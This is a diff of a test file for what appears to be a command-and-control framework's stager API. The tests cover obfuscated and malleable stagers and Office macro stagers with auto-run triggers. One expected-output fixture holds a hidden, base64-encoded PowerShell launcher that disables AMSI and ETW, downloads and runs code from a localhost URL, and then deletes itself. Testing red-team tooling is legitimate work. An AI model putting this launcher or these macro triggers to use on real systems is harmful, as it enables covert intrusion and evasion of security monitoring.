@@ -94,6 +94,27 @@ def test_create_stager_one_liner(client, base_stager, admin_auth_header):
     client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)
 
 
+def test_create_malleable_stager_one_liner(
+    client, base_stager_malleable, admin_auth_header
+):
+    # test that it ignore extra params
+    base_stager_malleable["options"]["xyz"] = "xyz"
+
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager_malleable,
+    )
+    assert response.status_code == 201
+    assert response.json()["options"].get("xyz") is None
+    assert len(response.json().get("downloads", [])) > 0
+    assert (
+        response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
+    )
+
+    client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)
+
+
 def test_create_obfuscated_stager_one_liner(client, base_stager, admin_auth_header):
     # test that it ignore extra params
     base_stager["options"]["xyz"] = "xyz"
@@ -114,12 +135,36 @@ def test_create_obfuscated_stager_one_liner(client, base_stager, admin_auth_head
     client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)
 
 
-def test_create_stager_file(client, base_stager_2, admin_auth_header):
+def test_create_obfuscated_malleable_stager_one_liner(
+    client, base_stager_malleable, admin_auth_header
+):
     # test that it ignore extra params
-    base_stager_2["options"]["xyz"] = "xyz"
+    base_stager_malleable["options"]["xyz"] = "xyz"
+
+    base_stager_malleable["name"] = "My_Obfuscated_Stager"
+    base_stager_malleable["options"]["Obfuscate"] = "True"
 
     response = client.post(
-        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager_2
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager_malleable,
+    )
+    assert response.status_code == 201
+    assert response.json()["options"].get("xyz") is None
+    assert len(response.json().get("downloads", [])) > 0
+    assert (
+        response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
+    )
+
+    client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)
+
+
+def test_create_stager_file(client, base_stager_dll, admin_auth_header):
+    # test that it ignore extra params
+    base_stager_dll["options"]["xyz"] = "xyz"
+
+    response = client.post(
+        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager_dll
     )
     assert response.status_code == 201
     assert response.json()["options"].get("xyz") is None
@@ -221,11 +266,11 @@ def test_download_stager_one_liner(client, admin_auth_header, base_stager):
     client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
 
 
-def test_download_stager_file(client, admin_auth_header, base_stager_2):
+def test_download_stager_file(client, admin_auth_header, base_stager_dll):
     response = client.post(
         "/api/v2/stagers/?save=true",
         headers=admin_auth_header,
-        json=base_stager_2,
+        json=base_stager_dll,
     )
     assert response.status_code == 201
     stager_id = response.json()["id"]
@@ -461,11 +506,71 @@ def test_bat_stager_creation(client, bat_stager, admin_auth_header):
     client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
 
 
+@pytest.mark.parametrize(
+    "document_type, trigger_function, expected_trigger",
+    [
+        ("word", "autoopen", "Sub AutoOpen()"),
+        ("word", "autoclose", "Sub AutoClose()"),
+        ("excel", "autoopen", "Sub Workbook_Open()"),
+        ("excel", "autoclose", "Sub Workbook_BeforeClose(Cancel As Boolean)"),
+    ],
+)
+def test_macro_stager_generation(
+    client,
+    windows_macro_stager,
+    admin_auth_header,
+    document_type,
+    trigger_function,
+    expected_trigger,
+):
+    windows_macro_stager["options"]["DocType"] = document_type
+    windows_macro_stager["options"]["Trigger"] = trigger_function
+
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=windows_macro_stager,
+    )
+
+    # Check if the stager is successfully created
+    assert response.status_code == 201
+    assert response.json()["id"] != 0
+
+    stager_id = response.json()["id"]
+
+    response = client.get(
+        f"/api/v2/stagers/{stager_id}",
+        headers=admin_auth_header,
+    )
+
+    # Check if we can successfully retrieve the stager
+    assert response.status_code == 200
+    assert response.json()["id"] == stager_id
+
+    response = client.get(
+        response.json()["downloads"][0]["link"],
+        headers=admin_auth_header,
+    )
+
+    # Check if the file is downloaded successfully
+    assert response.status_code == 200
+    assert response.headers.get("content-type").split(";")[0] in [
+        "text/plain",
+    ]
+    assert isinstance(response.content, bytes)
+
+    # Check if the downloaded file is not empty
+    assert len(response.content) > 0
+    assert expected_trigger in response.content.decode("utf-8")
+
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
+
+
 def _expected_http_bat_launcher():
     return dedent(
         """
         @echo off
-        start /B powershell.exe -nop -ep bypass -w 1 -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAEUAdgBlAG4AdABpAG4AZwAuAEUAdgBlAG4AdABQAHIAbwB2AGkAZABlAHIAXQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAbQBfAGUAbgBhAGIAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABJAG4AcwB0AGEAbgBjAGUAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFQAcgBhAGMAaQBuAGcALgBQAFMARQB0AHcATABvAGcAUAByAG8AdgBpAGQAZQByACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAZQB0AHcAUAByAG8AdgBpAGQAZQByACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkALAAwACkAOwAkAFIAZQBmAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AHYAYQBsAHUAZQAoACQATgB1AGwAbAAsACQAdAByAHUAZQApADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBpAHcAcgAoACcAaAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAAvAGQAbwB3AG4AbABvAGEAZAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwAnACkALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwB8AGkAZQB4AA==
+        start /B powershell.exe -nop -ep bypass -w 1 -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAEUAdgBlAG4AdABpAG4AZwAuAEUAdgBlAG4AdABQAHIAbwB2AGkAZABlAHIAXQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAbQBfAGUAbgBhAGIAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABJAG4AcwB0AGEAbgBjAGUAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFQAcgBhAGMAaQBuAGcALgBQAFMARQB0AHcATABvAGcAUAByAG8AdgBpAGQAZQByACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAZQB0AHcAUAByAG8AdgBpAGQAZQByACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkALAAwACkAOwAkAFIAZQBmAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AHYAYQBsAHUAZQAoACQATgB1AGwAbAAsACQAdAByAHUAZQApADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBpAHcAcgAoACcAaAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADEAMwAzADYALwBkAG8AdwBuAGwAbwBhAGQALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8AJwApAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAfABpAGUAeAA=
         timeout /t 1 > nul
         del "%~f0"
         """
